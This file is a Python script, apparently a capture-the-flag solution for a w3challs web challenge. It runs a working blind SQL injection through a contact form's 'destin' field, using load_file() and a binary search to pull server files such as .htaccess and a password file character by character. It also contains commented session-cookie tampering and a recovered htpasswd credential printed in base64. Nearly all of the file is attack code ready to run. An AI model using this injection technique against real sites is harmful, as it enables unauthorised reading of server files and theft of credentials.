#!/usr/bin/python

import io
import re
import pycurl
import random
import StringIO
import binascii
from urllib import urlencode


def clear(o):
    o.truncate(0)
    o.seek(0)

body_buffer = StringIO.StringIO()
header_buffer = StringIO.StringIO()


c = pycurl.Curl()
c.setopt(c.WRITEFUNCTION, body_buffer.write)
c.setopt(c.HEADERFUNCTION, header_buffer.write)

# c.setopt(c.COOKIE, '')
#
# c.setopt(c.URL, 'http://vip.hacking.w3challs.com/index.php?page=connexion')
# c.setopt(c.POSTFIELDS, urlencode({'login':'luG[3]R','pass':'kiss'}))
# c.perform()
#
# body = body_buffer.getvalue()
# header = header_buffer.getvalue()
#
# print(body)
# print(header)
#
# cookie = re.search('PHPSESSID=(.*);',header).group(1)
# print(cookie)
#
# clear(body_buffer)
# clear(header_buffer)
#
# c.setopt(c.COOKIE, 'PHPSESSID='+''.join([chr(random.randint(0,255)) for _ in range(32)]))
#
# c.setopt(c.URL, 'http://vip.hacking.w3challs.com/index.php')
# c.perform()
#
# body = body_buffer.getvalue()
# header = header_buffer.getvalue()
#
# print(body)
# print(header)
#
# clear(body_buffer)
# clear(header_buffer)
# #=> /home/vipwebarmy/www/index.php
# #=> /home/vipwebarmy/www/VipWebArmy.php
# #=> /home/vipwebarmy/www/.htaccess

def check(l,cur):
    c.setopt(c.URL, 'http://vip.hacking.w3challs.com/index.php?page=contact')
    cond = "ord(SUBSTRING(load_file(0x2f686f6d652f76697077656261726d792f7777772f2e6874616363657373),"+str(l)+"))<"+str(cur)
    cond = "ord(SUBSTRING(load_file(0x"+binascii.hexlify('/home/vipwebarmy/www/pass/pass.txt')+"),"+str(l)+"))<"+str(cur)
    c.setopt(c.POSTFIELDS, urlencode({'destin':"1 AND (SELECT (CASE WHEN ("+cond+") THEN 1 ELSE 1*(SELECT 1 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))",'msg':'aa'}))
    c.perform()

    body = body_buffer.getvalue()
    if re.search('recontacterons',body):
        return True
    else:
        return False

def check_equals(l,cur):
    c.setopt(c.URL, 'http://vip.hacking.w3challs.com/index.php?page=contact')
    cond = "ord(SUBSTRING(load_file(0x2f686f6d652f76697077656261726d792f7777772f2e6874616363657373),"+str(l)+"))=="+str(cur)
    c.setopt(c.POSTFIELDS, urlencode({'destin':"1 AND (SELECT (CASE WHEN ("+cond+") THEN 1 ELSE 1*(SELECT 1 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))",'msg':'aa'}))
    c.perform()

    body = body_buffer.getvalue()
    if re.search('recontacterons',body):
        return True
    else:
        return False


# <Files VipWebArmy.php>
# AuthType Basic
# AuthName "VipWebArmy - Protected Area"
# AuthUserFile "/home/vipwebarmy/www/pass/pass.txt"
# require valid-user
# </Files>

#army:xedh6CDiqPkbA

import base64
print(base64.b64encode("army:xedh6CDiqPkbA"))
exit()

ok = True
cur_htpasswd = ''
while ok:
    m = 0
    M = 128
    while M-m>1:
        cur = (M+m)//2

        if check(len(cur_htpasswd)+1,cur):
            print("OK "+str(cur))
            M = cur
        else:
            print("NOK "+str(cur))
            m = cur

        clear(body_buffer)
        clear(header_buffer)

    cur = (M+m)//2
    cur_htpasswd += chr(cur)
    if cur<=1:
        ok = False
    print(cur_htpasswd)
